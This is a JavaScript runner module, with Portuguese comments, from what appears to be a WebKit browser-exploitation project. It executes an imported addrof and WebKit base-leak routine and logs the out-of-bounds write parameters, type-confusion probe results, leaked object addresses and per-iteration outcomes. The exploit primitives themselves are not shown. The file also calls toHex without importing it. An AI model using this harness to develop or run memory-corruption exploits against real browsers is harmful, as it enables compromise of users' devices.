// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 43 - WebKit Leak - Massive Tests SR)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs'; // getOutputAdvancedS3 não é usado, pode remover se não for em outro lugar
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT // Nome base exportado pelo módulo de teste
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_MassiveSR";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT; // Usa o nome exportado

    if (!result) { // Checagem adicional para resultado nulo/undefined
        logS3(`  RUNNER R43(MassiveSR): Teste principal retornou resultado inválido (null/undefined).`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}_R43M_SR: Invalid Result!`;
        logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA COM ERRO ====`, 'test', FNAME_RUNNER);
        return;
    }

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(MassiveSR): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}_R43M_SR: MainTest ERR!`;
    } else { // Sem erro primário no resultado geral
        let bestParamsMsg = 'N/A';
        if (result.oob_params_of_best_result) {
            bestParamsMsg = `Offset: ${result.oob_params_of_best_result.offset}, Valor: ${result.oob_params_of_best_result.value} (RawOff: ${toHex(result.oob_params_of_best_result.raw_offset)}, RawVal: ${toHex(result.oob_params_of_best_result.raw_value)})`;
        } else {
            bestParamsMsg = "Nenhum parâmetro produziu um resultado de referência (sucesso ou último erro).";
        }
        logS3(`  RUNNER R43(MassiveSR): Completou. Melhores Parâmetros OOB: ${bestParamsMsg}`, "good", FNAME_RUNNER);

        if (result.tc_probe_details) {
            logS3(`  RUNNER R43(MassiveSR): Detalhes Sonda TC (Best): ${JSON.stringify(result.tc_probe_details)}`, "leak", FNAME_RUNNER);
        } else {
             logS3(`  RUNNER R43(MassiveSR): Detalhes Sonda TC (Best): N/A`, "warn", FNAME_RUNNER);
        }


        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result; // Este é o addrof_result do 'best_result_for_runner'
        const webkitLeakResult = result.webkit_leak_result; // Este é o webkit_leak_result do 'best_result_for_runner'

        logS3(`  RUNNER R43(MassiveSR): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            logS3(`  RUNNER R43(MassiveSR): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(MassiveSR): Teste Addrof (Best) não produziu resultado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(MassiveSR): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R43(MassiveSR): Teste WebKit Base Leak (Best) não produziu resultado.`, "warn", FNAME_RUNNER);
        }

        // Título da página baseado no melhor resultado da execução completa
        let finalTitleSegment = "No TC Confirmed SR";
        if (webkitLeakResult && webkitLeakResult.success) { // Checar webkitLeakResult antes de acessar .success
            finalTitleSegment = "WebKitLeak SUCCESS! SR";
        } else if (addrofResult && addrofResult.success) { // Checar addrofResult antes de acessar .success
            finalTitleSegment = "Addrof OK, WebKitLeak Fail SR";
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC OK, Addrof/WebKitLeak Fail SR";
        }
        document.title = `${module_name_for_title}_R43M: ${finalTitleSegment}`;

        // Sumário das iterações
        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(MassiveSR): Sumário completo das iterações (${result.iteration_results_summary.length} tentativas):`, "info", FNAME_RUNNER);
            result.iteration_results_summary.forEach((iter_sum, index) => {
                const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
                const addrofSuccessThisIter = iter_sum.addrof_result_this_iter?.success ?? 'N/A';
                const addrofCandidateThisIter = iter_sum.addrof_result_this_iter?.leaked_object_addr_candidate_str ?? 'N/A';
                const webkitLeakSuccess = iter_sum.webkit_leak_result_this_iter?.success ?? 'N/A';
                let logMsg = `    Iter ${index + 1} (Off ${iter_sum.oob_offset}, Val ${iter_sum.oob_value}): TC=${tcSuccess}, Addrof=${addrofSuccessThisIter}`;
                if(addrofSuccessThisIter === false && addrofCandidateThisIter !== 'N/A') logMsg += ` (Cand: ${addrofCandidateThisIter})`;
                logMsg += `, WebKitLeak=${webkitLeakSuccess}`;
                if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;

                logS3(logMsg, tcSuccess ? "info" : "info_detail", FNAME_RUNNER); // Menos verboso se TC falhou
            });
        } else {
            logS3(`  RUNNER R43(MassiveSR): Nenhuma iteração foi resumida.`, "warn", FNAME_RUNNER);
        }
    }
    // O título da página já deve ter sido definido dentro do if/else acima
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_MassiveSR`;
    logS3(`==== INICIANDO Script 3 R43M_SR (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = true; // Desabilitar botão durante a execução

    await runHeisenbugReproStrategy_TypedArrayVictim_R43();

    logS3(`\n==== Script 3 R43M_SR (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false; // Reabilitar botão

    // Lógica de fallback para o título da página, caso não tenha sido definido claramente
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("SUCCESS") &&
        !document.title.includes("Fail") &&
        !document.title.includes("OK") &&
        !document.title.includes("Confirmed") &&
        !document.title.includes("ERR") &&
        !document.title.includes("Invalid") &&
        !document.title.includes("Done")) { // Checar se já tem "Done"
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43M_SR_Done`;
    } else if (!document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT)) {
        // Se o título foi completamente sobrescrito por algo inesperado
        document.title = `AdvancedTest_S3_R43M_SR_Finished`;
    }
}
